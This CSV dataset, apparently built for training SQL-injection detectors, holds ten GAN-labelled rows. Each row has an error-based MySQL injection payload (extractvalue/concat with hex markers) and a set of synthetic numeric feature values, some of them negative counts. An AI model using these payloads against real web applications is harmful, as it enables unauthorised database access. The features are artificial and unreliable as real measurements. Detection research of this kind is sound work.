id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000001,attack,error,"1  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  5130  =  5130",nearest_attack_euclidean,R000239,4.317114140753826,162.1036376953125,41.91769790649414,31.872032165527344,62.85739517211914,-0.854245126247406,51.75933837890625,22.58616065979004,0.7447696924209595,0.2637622356414795,0.2176668494939804,0.3848276138305664,0.12584064900875092,3.684278726577759,0.5189117193222046,1.1272557973861694,0.5346500277519226,0.18755649030208588,0.17517532408237457,0.2938571274280548,5.462256908416748,6.091444969177246,4.1707353591918945,0.00876818597316742,1.270491600036621,0.4368453025817871,-0.18614447116851807,-0.08870202302932739,0.11166193336248398,0.1895514577627182,-0.08596768975257874,-0.17570248246192932,2.4531490802764893,0.05050842836499214,0.3984816372394562,1.5183323621749878,4.4807891845703125,0.6718493700027466,1.071834683418274,-0.005564745515584946,0.23295894265174866,0.39640772342681885,-0.235269233584404,0.2076757401227951,0.42886123061180115,-0.3379759192466736,-0.028470784425735474,0.15619555115699768,0.18230700492858887,0.22270967066287994,-0.08491367846727371,-0.04856611043214798,-0.1496724933385849,0.2506858706474304,-0.13083256781101227,-0.23278027772903442,-0.0038291476666927338,0.20332792401313782,0.0006822794675827026,0.17227688431739807,0.16380015015602112,-0.07010935246944427,-0.20635470747947693,-0.027872057631611824,0.29209521412849426,0.0009960085153579712,0.7222684621810913,0.50730299949646,0.1358940601348877,0.17283028364181519,-0.13704213500022888,-0.14122727513313293,0.016759853810071945,0.09204591810703278,0.036900971084833145,0.00689725112169981,1.2763999700546265,0.2397615760564804,-0.19933441281318665,0.06180417537689209,0.26455163955688477,4.3586273193359375,0.6413587331771851,0.32456547021865845,0.05009404942393303,0.7154223918914795,0.06714700162410736,0.09976082295179367,-0.018620386719703674
GAN_000002,attack,error,"1'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000183,4.02669962214631,163.00282287597656,47.195350646972656,31.180648803710938,62.05414962768555,0.33887699246406555,48.37367630004883,21.61786651611328,0.9100233316421509,0.29921334981918335,0.20143818855285645,0.3828149437904358,0.12428435683250427,3.7532105445861816,0.8716704249382019,0.7505339980125427,0.5430089235305786,0.0853559598326683,0.1845749467611313,0.09957427531480789,5.652371883392334,5.944378852844238,4.289834499359131,0.12340196967124939,1.3308141231536865,0.06453269720077515,0.06733088940382004,0.1271132379770279,0.06445619463920593,0.14697615802288055,0.04306137561798096,-0.14006051421165466,2.3667211532592773,0.019217675551772118,0.44194352626800537,1.4068950414657593,4.4132819175720215,0.8119149208068848,1.1891498565673828,-0.03104148805141449,0.2848997712135315,0.3323620557785034,0.012895062565803528,0.22827622294425964,-0.020196303725242615,-0.04542848467826843,-0.16432493925094604,0.13167762756347656,0.13340933620929718,0.1693405956029892,0.056083694100379944,0.0657605305314064,-0.15752854943275452,0.05905308574438095,0.03372063487768173,-0.21857890486717224,-0.11337663978338242,-0.16576479375362396,0.11481168121099472,0.154829740524292,-0.019728466868400574,-0.043629132211208344,0.0019226223230361938,0.004776947200298309,0.18538278341293335,-0.0493767224252224,0.768496572971344,0.14558416604995728,0.052665628492832184,0.05279109999537468,0.14336201548576355,0.04754047095775604,0.16630449891090393,0.10714627802371979,0.015735119581222534,-0.0006232872256077826,0.9176897406578064,0.30617454648017883,-0.05910142511129379,0.050543785095214844,0.07063758373260498,4.611096382141113,0.48580923676490784,0.09961807727813721,0.1917511522769928,0.8122677206993103,0.029597874730825424,0.06937625259160995,0.008038707077503204
GAN_000003,attack,error,"1'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000183,4.074336746689763,163.07290649414062,46.249446868896484,32.98706817626953,60.73473358154297,0.5550802946090698,48.32035446166992,21.809431076049805,1.1954975128173828,0.27579161524772644,0.19816291332244873,0.3866032361984253,0.12237811833620071,3.685053825378418,0.692787230014801,1.1148591041564941,0.8842566609382629,0.1576930433511734,0.14138135313987732,-0.15843680500984192,5.6043620109558105,5.91996431350708,3.985417127609253,0.11931218951940536,1.3302907943725586,0.24595513939857483,0.12811759114265442,0.17532095313072205,0.12918369472026825,0.13434387743473053,-0.021291136741638184,-0.022154122591018677,2.61470103263855,0.12904611229896545,0.4399851858615875,1.5521824359893799,4.3027472496032715,0.6850812435150146,1.1917216777801514,-0.1643969565629959,0.34511998295783997,0.2705489993095398,0.10381415486335754,0.2209862917661667,0.11355612426996231,-0.13677676022052765,-0.1860068142414093,0.14432042837142944,0.15940791368484497,0.14630046486854553,0.00858252588659525,0.07933062314987183,-0.2562329173088074,0.26873865723609924,-0.0010976418852806091,0.1005062609910965,0.22890585660934448,0.1560799479484558,-0.20294928550720215,0.08525353670120239,0.1089577004313469,0.14921973645687103,-0.16373130679130554,0.06156255677342415,0.32726892828941345,-0.04906339943408966,0.9124900698661804,-0.03299028426408768,0.1158447414636612,-0.001989603042602539,0.10959231853485107,-0.2660887539386749,-0.016660943627357483,0.04814780503511429,0.018640728667378426,0.01721974089741707,0.9052213430404663,0.2659515142440796,0.03635898604989052,0.05639377608895302,-0.0888102725148201,4.5167317390441895,0.41696587204933167,0.14592376351356506,0.12666001915931702,0.8583094477653503,-0.0317520797252655,-0.18114545941352844,0.06367693096399307
GAN_000004,attack,error,"1  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  5130  =  5130",nearest_attack_euclidean,R000239,4.2778958098179904,161.1122589111328,44.0600700378418,30.754053115844727,61.04167175292969,-0.23418596386909485,49.94090270996094,22.342445373535156,0.8032358288764954,0.2735201418399811,0.21592624485492706,0.3826410472393036,0.12307898700237274,3.7239577770233154,0.52986079454422,0.8373882174491882,0.4428982436656952,0.1613234132528305,0.16983549296855927,0.11418058723211288,5.687334060668945,5.894033432006836,3.913853883743286,0.017947405576705933,1.250610589981079,0.3802957832813263,-0.06826317310333252,-0.0320429801940918,0.12111744284629822,0.17467820644378662,0.054929088801145554,-0.3793237507343292,2.4370319843292236,-0.07858603447675705,0.38290560245513916,1.5066570043563843,4.48842716217041,0.7384615540504456,1.1432201862335205,-0.1815214604139328,0.3839441239833832,0.32023102045059204,-0.07962071895599365,0.20309172570705414,0.27871549129486084,-0.3395013213157654,0.007472202181816101,0.13017520308494568,0.18884135782718658,0.24549265205860138,0.022557983174920082,-0.025148605927824974,-0.02772931009531021,0.1917336881160736,-0.005873395595699549,-0.1413302719593048,-0.08088155835866928,0.03164995089173317,-0.05511349067091942,0.35157066583633423,0.016387619078159332,-0.04155508428812027,-0.1196470633149147,0.12803466618061066,0.26664748787879944,0.19771626591682434,0.7551757097244263,0.3787038326263428,0.11199770122766495,0.00949210673570633,-0.10583082586526871,-0.12376460433006287,0.24162915349006653,-0.06531760096549988,0.021232154220342636,0.002395534422248602,1.0483810901641846,0.2544208765029907,-0.25166475772857666,0.08941678702831268,0.24917802214622498,4.397307395935059,0.678535521030426,0.25835591554641724,0.160567969083786,0.8127800226211548,0.1902259886264801,-0.013731835409998894,0.15780159831047058
GAN_000005,attack,error,"1'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000183,4.0322763007257265,161.8191375732422,43.624088287353516,32.3930778503418,62.1798210144043,-0.5666490197181702,50.784080505371094,22.3681640625,0.9019854664802551,0.2656324803829193,0.20918706059455872,0.3807646334171295,0.12495426088571548,3.7317802906036377,0.8720536231994629,0.7478237748146057,0.531531810760498,0.13899102807044983,0.13311821222305298,0.26539480686187744,5.5506086349487305,6.069105625152588,4.315929412841797,0.004429660737514496,1.2382243871688843,0.2001062035560608,-0.23549668490886688,-0.010388092137873173,0.09660638123750687,0.16033358871936798,0.027220357209444046,-0.2520788609981537,2.478597402572632,0.15030032396316528,0.41735419631004333,1.3637304306030273,4.3894734382629395,0.5928872227668762,1.0335240364074707,-0.06902831792831421,0.3171026408672333,0.39373838901519775,-0.023277096450328827,0.18303819000720978,0.2264956831932068,-0.07078994810581207,-0.024441838264465332,0.14217275381088257,0.19622619450092316,0.20966896414756775,0.012800880707800388,0.03292454779148102,0.0026482343673706055,-0.05699404701590538,-0.15313851833343506,-0.07838381081819534,-0.01753462851047516,0.18228845298290253,-0.11665643751621246,0.2153606414794922,-0.012639030814170837,0.1647578775882721,-0.030386455357074738,-0.0021238327026367188,0.2393059879541397,0.09256195276975632,0.7311772704124451,0.27141839265823364,0.15339091420173645,-0.006515301764011383,-0.18231433629989624,-0.1655183881521225,0.15304596722126007,0.06734733283519745,0.013360993936657906,0.00999576598405838,1.0389443635940552,0.1807786375284195,-0.14756330847740173,0.07519502192735672,0.0938757136464119,4.451361656188965,0.6451767086982727,0.30076509714126587,0.026284364983439445,0.7758464217185974,0.0849810391664505,0.14828449487686157,0.021501831710338593
GAN_000006,attack,error,"1""   )    )    as rcse where 4559  =  4559 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --",nearest_attack_euclidean,R000019,4.400000045230807,163.57997131347656,47.435401916503906,32.294185638427734,61.934112548828125,0.45114564895629883,49.23244094848633,22.623374938964844,1.2698845863342285,0.25365614891052246,0.19288884103298187,0.3844294846057892,0.12411503493785858,3.677753210067749,0.8820217847824097,1.5830721855163574,0.9948016405105591,0.08636682480573654,0.14720909297466278,0.0552949458360672,5.588077068328857,5.861941814422607,4.53636360168457,0.0625511109828949,1.20477294921875,0.0054680295288562775,0.30152732133865356,0.03409917652606964,0.08900824189186096,0.15247587859630585,-0.11658401787281036,0.13722750544548035,2.5951685905456543,0.5333841443061829,0.5042731165885925,1.3872121572494507,4.0384087562561035,0.37551504373550415,1.0682625770568848,-0.18632081151008606,0.4078492820262909,0.47686782479286194,-0.09585857391357422,0.14489708840847015,0.16280889511108398,-0.058511048555374146,-0.38350993394851685,0.17401468753814697,0.11416037380695343,0.1691688448190689,-0.09502876549959183,0.16050079464912415,-0.4653521776199341,0.30584073066711426,-0.05117642879486084,-0.09021050482988358,0.22028204798698425,0.2624873220920563,0.1632111370563507,0.05593277886509895,-0.013221584260463715,0.4789770841598511,-0.24021145701408386,-0.14516156911849976,0.32576051354408264,-0.09358295798301697,0.8725984692573547,0.10652752965688705,0.34828636050224304,-0.08406440913677216,-0.06688607484102249,-0.41358447074890137,-0.09319964051246643,0.12322621047496796,0.029690932482481003,0.02171178348362446,1.0396572351455688,0.07097865641117096,0.004759639501571655,-0.09498525410890579,-0.25005948543548584,4.141060829162598,0.5897201895713806,0.2781778573989868,-0.10955949127674103,0.8314908146858215,0.027727637439966202,0.18610984086990356,0.02307797223329544
GAN_000007,attack,error,"1'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000183,4.234992767963964,162.14749145507812,45.323509216308594,31.636667251586914,60.75605010986328,-0.11311773210763931,49.7503547668457,22.309913635253906,1.0659911632537842,0.2757231593132019,0.20640552043914795,0.38488876819610596,0.12159822881221771,3.710547685623169,0.5690966248512268,0.9961525797843933,0.6025222539901733,0.13728192448616028,0.12160929292440414,-0.029294569045305252,5.946671962738037,6.049441814422607,3.9661643505096436,0.006276994943618774,1.2791695594787598,0.26623761653900146,0.10304084420204163,0.05128856003284454,0.04319637268781662,0.12466239929199219,-0.032172784209251404,-0.0654664933681488,2.5036818981170654,-0.026164278388023376,0.48381054401397705,1.5368568897247314,4.438621520996094,0.7459772229194641,1.2169767618179321,-0.055015929043293,0.3938930332660675,0.3553526997566223,-0.05914054811000824,0.19021357595920563,0.2490643560886383,-0.21074767410755157,-0.134571835398674,0.1160903126001358,0.17862333357334137,0.2121029496192932,-0.036545075476169586,0.02167397178709507,-0.15735140442848206,0.19910407066345215,0.020435508340597153,-0.22749724984169006,0.04588153958320618,-0.09100957214832306,0.012902013957500458,0.3081885874271393,0.08285313099622726,0.10070966184139252,-0.0992702916264534,-0.0018743686378002167,0.33054032921791077,0.07926144450902939,0.8570001721382141,0.1485297679901123,0.038351524621248245,-0.14389559626579285,0.05103929340839386,-0.12058687210083008,0.11667084693908691,-0.030315741896629333,0.022297058254480362,0.005248315632343292,0.9291574954986572,0.2973088026046753,-0.17538589239120483,0.059308771044015884,0.08200710266828537,4.369350910186768,0.5821813941001892,0.19653134047985077,0.13708703219890594,0.8256786465644836,0.04045300930738449,-0.0747852623462677,0.21499183773994446
GAN_000008,attack,error,"1'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000183,4.2898955832347845,163.15103149414062,43.14516067504883,30.946287155151367,60.03794479370117,-0.2950737774372101,50.50225067138672,23.310819625854492,1.1027812957763672,0.24815787374973297,0.20954950153827667,0.3847590386867523,0.12611541152000427,3.698913812637329,0.7031289935112,1.2257320880889893,0.6611984968185425,0.1924704611301422,0.16454540193080902,-0.09046879410743713,5.613391876220703,5.803031921386719,3.541292905807495,-0.014466740190982819,1.4024605751037598,0.340803325176239,-0.0668860450387001,-0.07753083109855652,0.1188049390912056,0.2236197590827942,0.10846567153930664,-0.18898916244506836,2.403792142868042,0.17842215299606323,0.3800433576107025,1.481742262840271,4.313539028167725,0.24483850598335266,1.1590576171875,-0.09572140127420425,0.3572154939174652,0.3445444107055664,0.0481911264359951,0.22480978071689606,0.29472556710243225,-0.13551032543182373,-0.17402902245521545,0.10834679752588272,0.10951720178127289,0.19177114963531494,-0.07223636656999588,0.10739093273878098,-0.2010100930929184,0.22575148940086365,-0.0665755644440651,-0.12930220365524292,-0.11570385843515396,0.08975338935852051,-0.05027008056640625,-0.09111040085554123,0.11692468076944351,0.28902667760849,-0.09575467556715012,-0.03273158520460129,0.26602134108543396,-0.06755053997039795,0.8455508351325989,0.4318421483039856,0.11650538444519043,0.010832622647285461,-0.06820281594991684,-0.112908735871315,0.14414015412330627,0.25207293033599854,0.025281237438321114,0.022943688556551933,1.0332789421081543,0.08728064596652985,-0.19059225916862488,0.02753196470439434,0.29219484329223633,4.741860866546631,0.6143781542778015,0.17033742368221283,0.08530271053314209,0.8183335661888123,0.11967174708843231,0.3422638177871704,-0.05926197022199631
GAN_000009,attack,error,"1  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  5130  =  5130",nearest_attack_euclidean,R000239,4.34098971444188,161.76454162597656,42.4559211730957,32.96523666381836,61.97953414916992,0.2324254810810089,51.858089447021484,22.607057571411133,0.8089038729667664,0.25900137424468994,0.20219339430332184,0.3803998827934265,0.12499597668647766,3.7060458660125732,0.582893431186676,0.9298454523086548,0.6065614223480225,0.1239396259188652,0.14847305417060852,0.009624052792787552,5.746732234954834,6.165748596191406,4.127690315246582,0.09371354430913925,1.303563117980957,0.40746626257896423,-0.13681000471115112,-0.08659175038337708,0.09559009969234467,0.21198013424873352,-0.13924218714237213,-0.26937252283096313,2.4437360763549805,0.00283011794090271,0.38700029253959656,1.5648343563079834,4.445370674133301,0.5722480416297913,1.050947904586792,-0.2627643346786499,0.4315687119960785,0.4338155686855316,-0.11595003306865692,0.16664735972881317,0.4494647681713104,-0.11168169975280762,-0.20355257391929626,0.15125060081481934,0.2041231393814087,0.25524863600730896,-0.05168499797582626,0.029034437611699104,-0.11775670945644379,0.29645732045173645,0.07565131783485413,-0.20691683888435364,-0.07578607648611069,0.07124052941799164,0.07306095212697983,0.25921010971069336,0.27770644426345825,0.2302999347448349,-0.15570172667503357,-0.08529607206583023,0.2583831250667572,0.14715808629989624,0.7041921019554138,0.3579370975494385,0.17086656391620636,0.018595166504383087,-0.37585803866386414,-0.07052364200353622,0.1483478844165802,-0.015320360660552979,0.020277991890907288,0.008545064367353916,1.115804672241211,0.152958482503891,-0.14758729934692383,0.00744529627263546,0.10017907619476318,4.6241044998168945,0.6943358778953552,0.3320513963699341,0.041413646191358566,0.7283802628517151,-0.01950686052441597,0.26983946561813354,0.34966856241226196
GAN_000010,attack,error,"1'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000183,4.109086802228521,160.21810913085938,43.88409423828125,31.573755264282227,62.76847457885742,-0.25984397530555725,50.172542572021484,23.101030349731445,0.9440962672233582,0.25845232605934143,0.20993776619434357,0.38053861260414124,0.12651458382606506,3.688755989074707,0.8172227144241333,0.9682368636131287,0.6744388937950134,0.18706071376800537,0.12531539797782898,0.23781824111938477,5.501392841339111,6.054422378540039,4.330419063568115,0.06654121726751328,1.2739455699920654,0.31181833148002625,-0.23796600103378296,-0.019135504961013794,0.017322417348623276,0.19921673834323883,-0.17919711768627167,-0.12381761521100998,2.4810688495635986,0.15885940194129944,0.46952924132347107,1.4435302019119263,4.380536079406738,0.3724285960197449,1.0560972690582275,-0.12448371946811676,0.3029676675796509,0.4300220310688019,-0.073698490858078,0.18196874856948853,0.3653830289840698,-0.031652629375457764,-0.1290656179189682,0.10344677418470383,0.1560988426208496,0.17137843370437622,-0.13361923396587372,0.06303398311138153,0.04944287985563278,0.14018088579177856,-0.1106274276971817,-0.22387781739234924,0.05051732063293457,0.0791676938533783,0.026945404708385468,0.041016750037670135,0.16852685809135437,0.06050579249858856,-0.15716353058815002,0.053256694227457047,0.23578085005283356,0.0013357363641262054,0.7825354933738708,0.24128291010856628,0.1992371529340744,0.0813646987080574,-0.18829244375228882,-0.14940309524536133,0.01093161478638649,0.23049676418304443,0.015977216884493828,0.013946707360446453,1.2304764986038208,0.16787007451057434,-0.21305251121520996,0.022508716210722923,0.1721532791852951,4.735616683959961,0.6049158573150635,0.22797834873199463,0.007359129376709461,0.7716800570487976,-0.05693430453538895,0.34770268201828003,-0.06931605935096741
